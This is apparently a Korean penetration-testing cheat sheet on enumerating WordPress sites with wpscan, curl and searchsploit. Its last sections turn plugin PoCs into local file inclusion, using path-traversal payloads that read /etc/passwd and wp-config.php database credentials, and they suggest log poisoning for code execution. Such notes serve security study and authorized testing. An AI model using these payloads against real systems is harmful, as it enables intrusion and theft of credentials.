# 01_열거_wpscan

# WordPress — 열거 (wpscan)

---

## WordPress 핵심 구조

```
/wp-admin/                      관리자 패널
/wp-login.php                   로그인
/wp-config.php                  ★ DB 자격증명 (최우선 탈취 대상)
/wp-content/themes/             테마
/wp-content/plugins/            플러그인
/wp-content/uploads/            업로드 (PHP 실행 여부 확인)
/xmlrpc.php                     XML-RPC API (브루트포스/SSRF)
/readme.html                    ★ WordPress 버전 노출
/wp-json/wp/v2/users            REST API 사용자 열거
/?author=1                      author ID로 사용자명 확인
```

---

## wpscan 기본 사용

```bash
# 종합 스캔 (가장 자주 사용)
wpscan --url http://<IP> \
  -e ap,at,u,vp,vt \
  --plugins-detection aggressive \
  --api-token <TOKEN> \
  -o wpscan.txt

# 토큰 없이 기본 스캔
wpscan --url http://<IP> -e ap,at,u

# HTTPS 인증서 무시
wpscan --url https://<IP> --disable-tls-checks -e ap,at,u

# HTTP 인증 필요한 경우
wpscan --url http://<IP> -e ap,at,u \
  --http-auth user:password

# 프록시 경유
wpscan --url http://<IP> -e ap,at,u \
  --proxy http://127.0.0.1:8080
```

---

## –enumerate 옵션 상세

| 옵션 | 설명 |
| --- | --- |
| `vp` | Vulnerable Plugins (취약한 플러그인) |
| `ap` | All Plugins (모든 플러그인) |
| `p` | Popular Plugins |
| `vt` | Vulnerable Themes |
| `at` | All Themes |
| `u` | Users (기본 1-10) |
| `u1-100` | Users ID 1~100 범위 |
| `cb` | Config Backups (wp-config.php.bak 등) |
| `dbe` | DB Exports (.sql 파일 등) |
| `tt` | Timthumbs |
| `m` | Media |

```bash
# 사용자만
wpscan --url http://<IP> -e u
wpscan --url http://<IP> -e u1-100

# 플러그인 공격적 탐지
wpscan --url http://<IP> -e ap --plugins-detection aggressive

# 전체
wpscan --url http://<IP> --enumerate ap,at,u,tt,cb,dbe,m,vp,vt \
  --plugins-detection aggressive --themes-detection aggressive
```

---

## REST API 사용자 열거

```bash
# 사용자 목록 (JSON)
curl http://<IP>/wp-json/wp/v2/users
curl http://<IP>/wp-json/wp/v2/users | python3 -m json.tool

# author ID 리다이렉트로 사용자명 확인
curl -s -I "http://<IP>/?author=1" | grep -i location
curl -s -I "http://<IP>/?author=2" | grep -i location

# 반복 확인
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{redirect_url}\n" "http://<IP>/?author=$i"
done
```

---

## WordPress 버전 확인

```bash
# readme.html (가장 명확)
curl http://<IP>/readme.html | grep -i version

# meta generator 태그
curl -s http://<IP>/ | grep "generator"

# style.css
curl http://<IP>/wp-content/themes/<테마명>/style.css | head -20

# feed
curl http://<IP>/?feed=rss2 | grep "<generator>"
```

---

## 플러그인/테마 CVE 검색

```bash
# wpscan 결과에서 플러그인 버전 확인 후
searchsploit wordpress plugin <플러그인명>
searchsploit wordpress <플러그인명> <버전>

# exploit-db 직접 검색
# https://www.exploit-db.com/?q=wordpress+<플러그인명>
```

---

## 취약 플러그인 PoC를 실제 LFI/RCE로 연결하기

버전 확인 → CVE/PoC 검색까지는 했는데, 그 PoC를 실제로 어떻게 적용해야 할지 막막할 때의 접근법.

```bash
# 1. exploit-db/searchsploit에서 PoC 원문 확인 (취약 파일 경로 + 파라미터명이 핵심)
searchsploit -x wordpress plugin <플러그인명>
# PoC 안에서 찾아야 할 것: 취약한 PHP 파일의 정확한 경로, 그 파일이 받는 파라미터 이름

# 2. 플러그인 설치 경로 규칙은 고정
http://<대상>/wp-content/plugins/<플러그인명>/<PoC에서 확인한 파일경로>?<파라미터>=<페이로드>

# 3. LFI류 플러그인 취약점이면 대표적으로 이런 파라미터명을 자주 씀 (PoC 없을 때 추측용)
?page=, ?file=, ?path=, ?template=, ?pl=, ?load=, ?view=

# 4. 확인 순서: 존재하는 파일부터
?<파라미터>=/etc/passwd          # 가장 먼저 시도, LFI 성립 여부 확인용 (그 자체가 목적은 아님)
?<파라미터>=../../../wp-config.php   # 진짜 노리는 파일 — DB 크리덴셜, 시크릿 키
?<파라미터>=../../../../etc/passwd   # 상위 디렉터리 개수를 늘려가며 시도 (경로 깊이를 모를 때)
```

## PoC가 아예 없는 플러그인일 때 (버전이 너무 오래됐거나 비공개)

```bash
# 플러그인 소스를 직접 받아서 취약 패턴을 눈으로 찾는다
wget https://downloads.wordpress.org/plugin/<플러그인명>.<버전>.zip
unzip <플러그인명>.<버전>.zip
grep -rn "include(\|include_once(\|require(\|require_once(" . | grep '\$_GET\|\$_POST\|\$_REQUEST'
# 사용자 입력을 검증 없이 include/require에 바로 넣는 코드가 있으면 LFI 후보
```

## 팁

- LFI가 확인되면 `/etc/passwd`로 성립 여부만 확인하고, 실제 가치 있는 파일(`wp-config.php`, 다른 CMS 설정파일, 애플리케이션 소스)로 바로 넘어간다
- wp-config.php 위치가 안 맞으면 문서 루트 기준 상대경로(`../wp-config.php`)와 절대경로(`/var/www/html/wp-config.php`) 둘 다 시도
- 이 취약점이 RCE로 안 이어지면 로그 포이즈닝(액세스 로그/PHP 세션 파일에 코드 심고 LFI로 실행)도 고려할 가치가 있음